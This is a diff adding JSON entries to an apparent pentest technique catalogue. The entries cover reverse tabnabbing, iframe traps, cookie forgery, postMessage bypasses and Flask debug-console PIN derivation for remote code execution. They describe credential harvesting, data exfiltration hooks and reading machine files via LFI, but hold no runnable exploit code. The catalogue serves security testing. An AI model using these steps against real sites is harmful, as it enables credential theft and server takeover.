+   "id": "reverse_tab_nabbing",
+   "name": "Reverse Tab Nabbing",
+   "summary": "Abusing a target=\"_blank\"/opener relationship so an attacker-controlled page can navigate the original tab to a phishing clone and steal credentials from an imitation login form.",
+   "objectives": [
+    "Find links/windows that expose window.opener to an attacker-controlled origin.",
+    "Navigate the opener tab to an attacker clone of the original page.",
+    "Imitate a login form to harvest the victim's credentials."
+   ],
+   "how_to_test": [
+    "Identify links using target=\"_blank\" (or window.open) without rel=\"noopener\" and with attacker-controllable href.",
+    "Open the link and check whether window.opener is non-null from the new page.",
+    "Set window.opener.location to an attacker clone and observe the original tab navigate.",
+    "Verify the clone renders a convincing copy of the victim's login page.",
+    "Confirm modern-browser implicit noopener versus explicit rel=\"opener\"/webview behavior."
+   ],
+   "techniques": [
+    "window.opener.location navigation to a phishing clone.",
+    "Explicit rel=\"opener\" or window.open() to force the opener reference.",
+    "Limited cross-origin WindowProxy property abuse (closed, frames, length, opener, parent, self, top)."
+   ],
+   "verify": "Set a unique marker in the opener's URL via window.opener.location and a negative-control page using rel=\"noopener\"; confirm the marker navigation occurs only when the opener reference exists."
+  },
+  {
+   "id": "iframe_traps",
+   "name": "Iframe Traps",
+   "summary": "Persisting a same-origin XSS by trapping the victim's continued navigation inside a full-page iframe while the attacker page stays alive on top and keeps collecting data.",
+   "objectives": [
+    "Keep attacker-controlled code alive across the victim's in-application navigation.",
+    "Observe keystrokes, form data, and traffic from the framed application.",
+    "Conceal the trap by mirroring the URL and hiding browser chrome."
+   ],
+   "how_to_test": [
+    "Land on an XSS-vulnerable same-origin page and inject a full-viewport iframe of the application.",
+    "Use history.replaceState to mirror the iframe's path into the address bar.",
+    "Hook fetch/XHR/pushState/replaceState/input events inside the framed app to exfiltrate data.",
+    "Verify the trap persists across link clicks and form submissions.",
+    "Test fullscreen concealment and whether the user can escape via tab close or URL change."
+   ],
+   "techniques": [
+    "Full-viewport iframe with URL mirroring via history.replaceState.",
+    "Hooking fetch, XHR, pushState/replaceState, and input/submit events.",
+    "Overlay/skimmer usage on checkout and payment pages.",
+    "POST-only reflected XSS upgraded via CSRF/auto-submit into the trap."
+   ],
+   "verify": "Inject a unique marker in the top page and a negative-control page without the trap; confirm the marker page keeps logging the victim's framed navigation while the control does not."
+  },
+  {
+   "id": "web_vulnerabilities_methodology",
+   "name": "Web Vulnerabilities Methodology",
+   "summary": "A checklist mapping the major web vulnerability classes and application components (proxies, user input, headers, files, frameworks, CMS) so nothing obvious is missed during a pentest.",
+   "objectives": [
+    "Systematically cover every attack-surface class (input, headers, files, frameworks).",
+    "Prioritize high-value forgotten components (installers, JS bundles, service workers).",
+    "Cross-reference findings to escalate individual bugs."
+   ],
+   "how_to_test": [
+    "Walk the checklist top-to-bottom: proxies, reflected/search input, forms/WebSockets/postMessage, headers, files, identity.",
+    "Download front-end bundles and *.map files and grep for leaked routes, GraphQL hashes, and Server Actions.",
+    "Fuzz for installer/setup/recovery paths and readable config files.",
+    "Test structured inputs (deserialization, XXE, JWT, email header injection) where those formats are used.",
+    "Review framework/CMS-specific defaults and dangerous endpoints."
+   ],
+   "techniques": [
+    "Category-based attack-surface enumeration (proxies, input, files, identity, frameworks).",
+    "Bundle/source-map mining for hidden routes and persisted queries.",
+    "Installer/reinitialization and session-persistence abuse.",
+    "Service worker / WASM / File System Access API pivots."
+   ],
+   "verify": "Run the checklist against a test app seeded with a unique marker in one forgotten surface (e.g. an installer path); confirm the marker surface is identified while a negative-control surface outside the checklist stays unflagged."
+  },
+  {
+   "id": "cookie_hacking",
+   "name": "Cookie Hacking",
+   "summary": "Attacks on cookie attributes, flags, and parsing — including HttpOnly bypasses, __Host-/__Secure- prefix forgery, cookie smuggling, and cryptographic forgery of cookie values.",
+   "objectives": [
+    "Understand cookie attributes (Domain/Path/SameSite) and flags (HttpOnly/Secure) and their bypasses.",
+    "Forge or smuggle cookies to override trusted values or bypass CSRF/WAF.",
+    "Break weak cookie encryption (static keys, padding oracle, ECB/CBC-MAC)."
+   ],
+   "how_to_test": [
+    "Decode cookies (base64/hex) and test modification to impersonate other users.",
+    "Test HttpOnly bypass via response-body reflection (phpinfo), TRACE, cookie jar overflow, or the cookie sandwich.",
+    "Prepend Unicode whitespace (U+2000) or \"$Version=1\" to forge __Host-/__Secure- prefixed cookies.",
+    "Probe empty/malformed cookie parsing (quoted values, comma/space delimiters) for injection.",
+    "Forge cookies by encrypting a predictable user ID with a static key, or run padbuster for padding-oracle decryption."
+   ],
+   "techniques": [
+    "HttpOnly bypass (phpinfo reflection, TRACE/cross-site tracking, cookie sandwich).",
+    "__Host-/__Secure- prefix forgery via Unicode whitespace and legacy $Version=1 splitting.",
+    "Empty-cookie and cookie-smuggling parsing abuse.",
+    "Padding oracle (padbuster), ECB/CBC-MAC, and static/public-key cookie forgery."
+   ],
+   "verify": "Set a forged __Host- cookie with a unique marker value from a subdomain, plus a negative-control normal cookie name; confirm the backend accepts the marker value as the protected cookie while the control is ignored."
+  },
+  {
+   "id": "postmessage_vulnerabilities",
+   "name": "PostMessage Vulnerabilities",
+   "summary": "Exploiting cross-window postMessage flows through missing or bypassable origin checks, wildcard targetOrigin, and DOM sinks to achieve XSS, data theft, or account takeover.",
+   "objectives": [
+    "Enumerate postMessage listeners and their origin/validation logic.",
+    "Bypass weak origin checks (indexOf/search/match, null origin, e.source).",
+    "Trigger sinks (innerHTML, location, prototype pollution, script loading) via forged messages."
+   ],
+   "how_to_test": [
+    "Search JS for addEventListener('message')/$(window).on and enumerate with getEventListeners(window).",
+    "Frame the page and send messages with wildcard targetOrigin; navigate the iframe to an attacker origin to receive sensitive messages.",
+    "Test indexOf()/search()/match() origin checks with confusable or overlapping domains.",
+    "Use sandboxed iframes (allow-popups) so e.origin == window.origin == null, bypassing equality checks.",
+    "Find relay pages on trusted origins that echo query params via postMessage and stitch them to privileged listeners."
+   ],
+   "techniques": [
+    "Wildcard targetOrigin + iframe navigation to steal messages.",
+    "Origin-check bypass (indexOf, search, match, isTrusted, escapeHtml, null origin).",
+    "javascript: URL substring-scheme bypass into location.href sinks.",
+    "Prototype pollution/XSS via postMessage and Math.random() callback-token prediction."
+   ],
+   "verify": "Send a forged message with a unique marker payload to a listener plus a negative-control message from a disallowed origin; confirm the marker message triggers the sink while the control is dropped."
+  },
+  {
+   "id": "flask_debug_pin",
+   "name": "Flask/Werkzeug Debug Console PIN Derivation (RCE)",
+   "summary": "The Werkzeug interactive debugger (debug=True) exposes /console with a predictable PIN derived from machine values (username, modname, app name, module path, MAC, machine-id). Gathering those lets you compute the PIN, unlock the console, and execute arbitrary Python on the server.",
+   "objectives": [
+    "Find a live Werkzeug/Flask debug console (/console, ?__debugger__=yes) with EVALEX=true.",
+    "Gather the six PIN inputs (username, modname, appname, mod_path, MAC decimal, machine_id).",
+    "Compute the PIN and authenticate, then execute code to prove RCE."
+   ],
+   "how_to_test": [
+    "GET /console and confirm a PIN prompt (auth:false).",
+    "Gather mod_path + username from the 500 traceback; MAC from /sys/class/net/eth0/address via LFI; machine_id from /etc/machine-id via LFI.",
+    "Compute the PIN with the Werkzeug get_pin_and_cookie_name algorithm (SHA1 over the 6 bits + cookiesalt/pinsalt).",
+    "Submit the PIN; on auth:true run a marker eval to confirm code execution."
+   ],
+   "techniques": [
+    "Read skill bs-flask-debug-rce for the full algorithm + brute-force matrix.",
+    "Werkzeug source werkzeug/debug/__init__.py get_pin_and_cookie_name.",
+    "Brute-force unknown bits (username/mod_path/MAC) with a bounded candidate list, minding the ~10-PIN lockout."
+   ],
+   "verify": {
+    "marker": "eval marker returns (auth:true + marker string echoed)",
+    "negative_control": "wrong PIN returns auth:false (proves the auth check is real)"
+   }
+  }
+ ]
+}
